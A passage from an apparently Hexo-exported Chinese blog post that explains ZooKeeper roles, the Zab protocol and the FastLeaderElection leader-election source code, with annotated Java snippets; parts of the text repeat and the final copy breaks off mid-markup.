class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>可以看出，比较的顺序是Epoch、zxid、Id，优先选投票轮次高的，投票轮次相同选Zxid高的，Zxid相同选id高的，因此在Zookeeper启动的时候，往往id高的获得Leader，但不绝对，比如在5个节点的集群中，启动顺序分别是1-&gt;2-&gt;3-&gt;4-&gt;5，当票选到节点3时已经票选超过半数，那么后面启动的4和5就直接成为follower</p>\n<p>接下来再分析<code>FOLLOWING</code>和<code>LEADING</code><br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(n.electionEpoch == logicalclock)&#123;</span><br><span class=\"line\">    recvset.put(n.sid, <span class=\"keyword\">new</span> Vote(n.leader, n.zxid, n.electionEpoch, n.peerEpoch));</span><br><span class=\"line\">    <span class=\"comment\">// 如果推举的Leader是自己，把自己的状态改为LEADING</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(ooePredicate(recvset, outofelection, n)) &#123;</span><br><span class=\"line\">        self.setPeerState((n.leader == self.getId()) ?</span><br><span class=\"line\">        ServerState.LEADING: learningState());</span><br><span class=\"line\">    Vote endVote = <span class=\"keyword\">new</span> Vote(n.leader, n.zxid, n.electionEpoch, n.peerEpoch);</span><br><span class=\"line\">    leaveInstance(endVote);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> endVote;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">/*</span><br><span class=\"line\"> * 确定Leader之前要保证半数以上的节点已经成为follower</span><br><span class=\"line\"> * Before joining an established ensemble, verify</span><br><span class=\"line\"> * a majority is following the same leader.</span><br><span class=\"line\"> */</span></span><br><span class=\"line\">outofelection.put(n.sid, <span class=\"keyword\">new</span> Vote(n.version,</span><br><span class=\"line\">        n.leader,</span><br><span class=\"line\">        n.zxid,</span><br><span class=\"line\">        n.electionEpoch,</span><br><span class=\"line\">        n.peerEpoch,</span><br><span class=\"line\">        n.state));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(ooePredicate(outofelection, outofelection, n)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">synchronized</span>(<span class=\"keyword\">this</span>)&#123;</span><br><span class=\"line\">            logicalclock = n.electionEpoch;</span><br><span class=\"line\">            self.setPeerState((n.leader == self.getId()) ?</span><br><span class=\"line\">                ServerState.LEADING: learningState());</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        Vote endVote = <span class=\"keyword\">new</span> Vote(n.leader, n.zxid, n.electionEpoch, n.peerEpoch);</span><br><span class=\"line\">        leaveInstance(endVote);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> endVote;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这里需要解释一下<code>ooePredicate</code><br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span><br><span class=\"line\"> * This predicate checks that a leader has been elected. It doesn't</span><br><span class=\"line\"> * make a lot of sense without context (check lookForLeader) and it</span><br><span class=\"line\"> * has been separated for testing purposes.</span><br><span class=\"line\"> * 有两个map，一个表示收到的投票集合，一个表示LEADING状态节点和FOLLOWING节点的投票</span><br><span class=\"line\"> * 集合，这里要确定两个条件：一个是在收到的LOOKING节点中半数认为n节点应该是Leader</span><br><span class=\"line\"> * 另一个是LEADING节点必须告诉其他节点自己是LEADING状态，避免一直投票</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * <span class=\"doctag\">@param</span> recv  map of received votes</span><br><span class=\"line\"> * <span class=\"doctag\">@param</span> ooe   map containing out of election votes (LEADING or FOLLOWING)</span><br><span class=\"line\"> * <span class=\"doctag\">@param</span> n     Notification</span><br><span class=\"line\"> * <span class=\"doctag\">@return</span></span><br><span class=\"line\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">boolean</span> <span class=\"title\">ooePredicate</span><span class=\"params\">(HashMap&lt;Long,Vote&gt; recv,</span><br><span class=\"line\">                                HashMap&lt;Long,Vote&gt; ooe,</span><br><span class=\"line\">                                Notification n)</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> (termPredicate(recv, <span class=\"keyword\">new</span> Vote(n.version,</span><br><span class=\"line\">                                         n.leader,</span><br><span class=\"line\">                                         n.zxid,</span><br><span class=\"line\">                                         n.electionEpoch,</span><br><span class=\"line\">                                         n.peerEpoch,</span><br><span class=\"line\">                                         n.state))</span><br><span class=\"line\">            &amp;&amp; checkLeader(ooe, n.leader, n.electionEpoch));</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>再来看一下<code>checkLeader</code><br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span><br><span class=\"line\">    * In the case there is a leader elected, and a quorum supporting</span><br><span class=\"line\">    * this leader, we have to check if the leader has voted and acked</span><br><span class=\"line\">    * that it is leading. We need this check to avoid that peers keep</span><br><span class=\"line\">    * electing over and over a peer that has crashed and it is no</span><br><span class=\"line\">    * longer leading.</span><br><span class=\"line\">    *</span><br><span class=\"line\">    * <span class=\"doctag\">@param</span> votes set of votes</span><br><span class=\"line\">    * <span class=\"doctag\">@param</span>   leader  leader id</span><br><span class=\"line\">    * <span class=\"doctag\">@param</span>   electionEpoch   epoch id</span><br><span class=\"line\">    */</span></span><br><span class=\"line\">   <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">boolean</span> <span class=\"title\">checkLeader</span><span class=\"params\">(</span><br><span class=\"line\">           HashMap&lt;Long, Vote&gt; votes,</span><br><span class=\"line\">           <span class=\"keyword\">long</span> leader,</span><br><span class=\"line\">           <span class=\"keyword\">long</span> electionEpoch)</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"keyword\">boolean</span> predicate = <span class=\"keyword\">true</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"comment\">/*</span><br><span class=\"line\">        * If everyone else thinks I'm the leader, I must be the leader.</span><br><span class=\"line\">        * The other two checks are just for the case in which I'm not the</span><br><span class=\"line\">        * leader. If I'm not the leader and I haven't received a message</span><br><span class=\"line\">        * from leader stating that it is leading, then predicate is false.</span><br><span class=\"line\">        */</span></span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"keyword\">if</span>(leader != self.getId())&#123;</span><br><span class=\"line\">           <span class=\"keyword\">if</span>(votes.get(leader) == <span class=\"keyword\">null</span>) predicate = <span class=\"keyword\">false</span>;</span><br><span class=\"line\">           <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(votes.get(leader).getState() != ServerState.LEADING) predicate = <span class=\"keyword\">false</span>;</span><br><span class=\"line\">       &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(logicalclock != electionEpoch) &#123;</span><br><span class=\"line\">           predicate = <span class=\"keyword\">false</span>;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"keyword\">return</span> predicate;</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure></p>\n<p><code>FastLeaderElection</code>源码分析完了，总结一下：首先，每个节点先给自己投票，然后将投票信息发送给集群中的其他节点；每个节点收到其他节点的投票，放在<strong>投票队列</strong>中，从队列中提取投票，跟自己的投票比较，如果投票更合理，就替换自己的投票，否则不改变自己的投票。然后检测自己当前的投票是否相同于集群半数以上的节点，如果相同于半数以上投票，则判断这个投票是不是投的自己，如果是投的自己，则改变自己的状态为LEADING，否则改为FOLLOWING或者OBSERVER，最后返回最后的投票，并结束<code>LookForLeader</code>。</p>\n","excerpt":"<h2 id=\"Zookeeper简介\"><a href=\"#Zookeeper简介\" class=\"headerlink\" title=\"Zookeeper简介\"></a>Zookeeper简介</h2><p>Zookeeper 是Apache Hadoop开源项目中的子项目，提供了一个分布式的协调服务框架。Zookeeper暴露了一组简单的操作原语(Primitive)集合，分布式应用能够基于这些原语实现更加高层的服务，包括同步机制、配置管理、服务器集群管理和统一命名服务等。</p>\n<p>作为一个分布式的服务框架，Zookeeper主要解决分布式集群中应用系统的一致性问题，它采用类似文件系统目录的节点树的结构作为数据存储模型，并对已存储数据的状态变化进行维护和监控，通过监控这些数据状态的变化实现基于数据的集群管理。</p>\n<p>Zookeeper 采用服务器集群的方式提供基本服务，服务器集群成为组，组中的成员具有两种角色，即一个唯一的领导者和若干个成员服务器，组能够为多个客户端提供服务。</p>","more":"<h2 id=\"Zookeeper角色\"><a href=\"#Zookeeper角色\" class=\"headerlink\" title=\"Zookeeper角色\"></a>Zookeeper角色</h2><p>Zookeeper中的角色主要有以下几种</p>\n<table>\n<thead>\n<tr>\n<th>角色</th>\n<th>角色说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>领导者(Leader)</td>\n<td>Leader不接受客户端的请求，负责进行投票的发起和决议，最终更新状态</td>\n</tr>\n<tr>\n<td>学习者(Learner)-跟随着(Follower)</td>\n<td>Follower用于接收客户请求并向客户端返回结果，在选举过程中参与投票</td>\n</tr>\n<tr>\n<td>学习者(Learner)-观察者(Obserber)</td>\n<td>Observer可以接收客户端连接，将写请求转发给Leader节点。但它不参与投票过程，只同步Leader的状态。Observer的目的是为了扩展系统，提高读取速度</td>\n</tr>\n<tr>\n<td>客户端(Client)</td>\n<td>请求发起方</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"Zookeeper-工作原理\"><a href=\"#Zookeeper-工作原理\" class=\"headerlink\" title=\"Zookeeper 工作原理\"></a>Zookeeper 工作原理</h2><p>Zookeeper服务有两种不同的运行模式。一种是“独立模式”，即只有一个Zookeeper服务器。这种模式较为简单，比较适合测试环境，但不能保证高可用性和恢复性。在实际应用中，Zookeeper通常以“复制模式”运行在一个计算机集群上。Zookeeper通过复制来实现高可用性，只要集群中半数以上的机器处于可用状态，它就能提供服务。也就是说，在一个有2n+1节点的集群中，任意n台机器出现故障，都可以保证服务继续，因为剩下的n+1台超过了半数。出于这个原因，一个集群通常包含奇数台机器。</p>\n<p>从概念上说，Zookeeper非常简单：它所做的就是确保对znode树的每一个修改都会被复制到集群中超过半数的机器上。如果少于半数的机器出现故障，则最少有一台机器会保存最新状态。其余的副本最终也会更新到这个状态。为了实现这个想法，Zookeeper使用了Azb协议。Zab协议包含两个可以无限重复的阶段：</p>\n<p><code>阶段一</code>: 当服务启动或者Leader崩溃后，Zab就进入了阶段1。当Leader被选举出来，且超过半数(或指定数量)的Learner完成了和Leader的状态同步以后，阶段1就结束了。状态同步保持了Leader和其他服务器具有相同的系统状态。<br><code>阶段二</code>: 原子广播<br>所有的写请求都被转发给Leader，再有Leader将更新广播给Learner。当半数以上的Follower已经将修改持久化以后，Leader才会提交这个更新，然后客户端才会收到一个更新成功的响应。这个用来达成共识的协议被设计成具有原子性，因此每个修改要么成功，要么失败。</p>\n<h2 id=\"Zookeeper-Leader选举源码\"><a href=\"#Zookeeper-Leader选举源码\" class=\"headerlink\" title=\"Zookeeper Leader选举源码\"></a>Zookeeper Leader选举源码</h2><p>Zookeeper 中QuorumPeer类出于源码“中心”位置，它与多个类关联，负责管理quorum协议。QuorumPeer继承自Thread，是集群环境下Zookeeper服务器的主线程类。它有4种状态： LOOKING、FOLLOWING、LEADING和OBSERVING，由成员state标识:<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// src/java/main/org/apache/zookeeper/server/quorum/QuorumPeer.java</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">enum</span> ServerState &#123;</span><br><span class=\"line\">        LOOKING, FOLLOWING, LEADING, OBSERVING;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure></p>\n<p>这4中状态决定了QuorumPeer的行为，即在集群中充当什么角色。state的初始状态是LOOKING，意思是寻找Leader服务器。一旦选举出Leader，QuorumPeer就切换自身状态，修改state的值，同时实例化对应的服务器控制类。服务器控制类有3种，Leader、Follower和Observer，它们作为QuorumPeer成员对象存在。</p>\n<blockquote>\n<p>前面废话了这么多现在正式进入正题。。。。。。</p>\n</blockquote>\n<p>QuorumPeer类有一个属性成员electionAlg，它是Election接口类型。服务器启动时，根据配置信息决定Election的具有实现类，指定选举算法。Election共有两个抽象方法<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">interface</span> <span class=\"title\">Election</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> Vote <span class=\"title\">lookForLeader</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> InterruptedException</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">shutdown</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>其中lookForLeader()是核心方法，返回一个Vote类型对象，标识被推荐服务器。Election的实现类有<code>LeaderEletcion</code>、<code>FastLeaderElection</code>、<code>AuthFastLeaderElection</code>。它们之间的区别在于通信机制以及lookForLeader的算法实现。由于源码中已经表示<code>LeaderElection</code>和<code>AuthFastLeaderElection</code>已经在3.4.0版本被弃用，因此在这里主要看<code>FastLeaderElection</code>。</p>\n<p><code>FastLeaderElection</code>有3个内部线程类: Listener、SendWorker、RecvWorker。Listener线程新建ServerSocketChannel，监听选举端口，一旦接收到连接请求，调用receiveConnection方法，启动发送线程SendWorker和接收线程RecvWorker。</p>\n<p><code>LookForLeader</code>详细源码<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">synchronized</span>(<span class=\"keyword\">this</span>)&#123;</span><br><span class=\"line\">    logicalclock++;</span><br><span class=\"line\">    updateProposal(getInitId(), getInitLastLoggedZxid(), getPeerEpoch());</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">sendNotifications();</span><br></pre></td></tr></table></figure></p>\n<p>原子性操作，Leader选举开始每个节点投自己一票，其中<code>getInitId()</code>、<code>getInitLastLoggedZxid()</code>、<code>getPeerEpoch()</code>表示当前self节点的状态，然后将投票结果send给其他节点。接下来就循环交换投票信息，直到找到Leader节点。<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">while</span> ((self.getPeerState() == ServerState.LOOKING) &amp;&amp; (!stop)) &#123;</span><br><span class=\"line\">    <span class=\"comment\">/*</span><br><span class=\"line\">     * 从投票消息队列中接收一条消息</span><br><span class=\"line\">     */</span></span><br><span class=\"line\">    Notification n = recvqueue.poll(notTimeout,</span><br><span class=\"line\">              TimeUnit.MILLISECONDS);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (n == <span class=\"keyword\">null</span>) &#123;...&#125;</span><br><span class=\"line\">    <span class=\"comment\">/*</span><br><span class=\"line\">     * 检查n节点是不是参与投票的节点，只有PeerType=PARTICIPANT的节点消息才会参与投票</span><br><span class=\"line\">     * Observers are not contained in this view, only nodes with</span><br><span class=\"line\">     * PeerType=PARTICIPANT.</span><br><span class=\"line\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(self.getVotingView().containsKey(n.sid)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">switch</span> (n.state) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> LOOKING: 跟自己的投票比较。</span><br><span class=\"line\">            <span class=\"keyword\">case</span> OBSERVING: 没有操作</span><br><span class=\"line\">            <span class=\"keyword\">case</span> FOLLOWING:</span><br><span class=\"line\">            <span class=\"keyword\">case</span> LEADING: 当已经收到LEADING和FOLLOWING表示已经票选出Leader，然后投最后一票给Leader，结束投票</span><br><span class=\"line\">            <span class=\"keyword\">default</span>: 没有操作</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>分别看<code>LOOKING</code>和<code>FOLLOWING</code>、<code>LEADING</code>干了什么<br><code>LOOKING</code>在干的事情<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span><br><span class=\"line\"> * 表示投票轮次大于本节点记录的轮次，表示自己已经落后投票了，将自己的</span><br><span class=\"line\"> * 投票轮次设置为最新的，清空自己的票箱，这个票箱记录了集群中其他节点</span><br><span class=\"line\"> * 的投票结果</span><br><span class=\"line\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (n.electionEpoch &gt; logicalclock) &#123;</span><br><span class=\"line\">    logicalclock = n.electionEpoch;</span><br><span class=\"line\">    recvset.clear();</span><br><span class=\"line\">    <span class=\"comment\">/*</span><br><span class=\"line\">     * 将n节点的投票结果与自己的投票结果比较,如果投票比自己的投票合理，</span><br><span class=\"line\">     * 更新自己的投票，否则还是投自己</span><br><span class=\"line\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(totalOrderPredicate(n.leader, n.zxid, n.peerEpoch,</span><br><span class=\"line\">    　　　　getInitId(), getInitLastLoggedZxid(), getPeerEpoch())) &#123;</span><br><span class=\"line\">        updateProposal(n.leader, n.zxid, n.peerEpoch);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    \tupdateProposal(getInitId(),</span><br><span class=\"line\">        \tgetInitLastLoggedZxid(),</span><br><span class=\"line\">        \tgetPeerEpoch());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 发送自己的投票结果</span></span><br><span class=\"line\">    sendNotifications();</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (n.electionEpoch &lt; logicalclock) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 投票轮次比自己记录的轮次小，说明这个投票已经过时，不处理</span></span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (totalOrderPredicate(n.leader, n.zxid, n.peerEpoch,</span><br><span class=\"line\">          proposedLeader, proposedZxid, proposedEpoch)) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 如果是一个轮次，将n节点的投票与自己比较，如果投票更合理，更新投票</span></span><br><span class=\"line\">    updateProposal(n.leader, n.zxid, n.peerEpoch);</span><br><span class=\"line\">    sendNotifications();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 将n节点的投票记录下来</span></span><br><span class=\"line\">recvset.put(n.sid, <span class=\"keyword\">new</span> Vote(n.leader, n.zxid, n.electionEpoch, n.peerEpoch));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span><br><span class=\"line\"> * 在自己的票箱中查看自己投票的节点是否已经被集群中一半以上的</span><br><span class=\"line\"> * 节点认可了，如果已经有一半以上的节点认可，则结束选举</span><br><span class=\"line\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (termPredicate(recvset,</span><br><span class=\"line\">         <span class=\"keyword\">new</span> Vote(proposedLeader, proposedZxid,</span><br><span class=\"line\">         logicalclock, proposedEpoch))) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Verify if there is any change in the proposed leader</span></span><br><span class=\"line\">    <span class=\"comment\">// 这里没太理解，</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span>((n = recvqueue.poll(finalizeWait,</span><br><span class=\"line\">            TimeUnit.MILLISECONDS)) != <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(totalOrderPredicate(n.leader, n.zxid, n.peerEpoch,</span><br><span class=\"line\">                 proposedLeader, proposedZxid, proposedEpoch))&#123;</span><br><span class=\"line\">            recvqueue.put(n);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/*</span><br><span class=\"line\">     * This predicate is true once we don't read any new</span><br><span class=\"line\">     * relevant message from the reception queue</span><br><span class=\"line\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (n == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">        self.setPeerState((proposedLeader == self.getId()) ?</span><br><span class=\"line\">            ServerState.LEADING: learningState());</span><br><span class=\"line\"></span><br><span class=\"line\">        Vote endVote = <span class=\"keyword\">new</span> Vote(proposedLeader,</span><br><span class=\"line\">            proposedZxid,</span><br><span class=\"line\">            logicalclock,</span><br><span class=\"line\">            proposedEpoch);</span><br><span class=\"line\">        leaveInstance(endVote);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> endVote;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>其中没有说清楚接收的投票如何和自己的投票比较的，也就是<code>totalOrderPredicate</code>方法的实现<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">boolean</span> <span class=\"title\">totalOrderPredicate</span><span class=\"params\">(<span class=\"keyword\">long</span> newId, <span class=\"keyword\">long</span> newZxid, <span class=\"keyword\">long</span> newEpoch, <span class=\"keyword\">long</span> curId, <span class=\"keyword\">long</span> curZxid, <span class=\"keyword\">long</span> curEpoch)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(self.getQuorumVerifier().getWeight(newId) == <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/*</span><br><span class=\"line\">     * We return true if one of the following three cases hold:</span><br><span class=\"line\">     * 1- New epoch is higher</span><br><span class=\"line\">     * 2- New epoch is the same as current epoch, but new zxid is higher</span><br><span class=\"line\">     * 3- New epoch is the same as current epoch, new zxid is the same</span><br><span class=\"line\">     *  as current zxid, but server id is higher.</span><br><span class=\"line\">     */</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> ((newEpoch &gt; curEpoch) ||</span><br><span class=\"line\">            ((newEpoch == curEpoch) &amp;&amp;</span><br><span class=\"line\">            ((newZxid &gt; curZxid) || ((newZxid == curZxid) &amp;&amp; (newId &gt; curId)))));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>可以看出，比较的顺序是Epoch、zxid、Id，优先选投票轮次高的，投票轮次相同选Zxid高的，Zxid相同选id高的，因此在Zookeeper启动的时候，往往id高的获得Leader，但不绝对，比如在5个节点的集群中，启动顺序分别是1-&gt;2-&gt;3-&gt;4-&gt;5，当票选到节点3时已经票选超过半数，那么后面启动的4和5就直接成为follower</p>\n<p>接下来再分析<code>FOLLOWING</code>和<code>LEADING</code><br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span 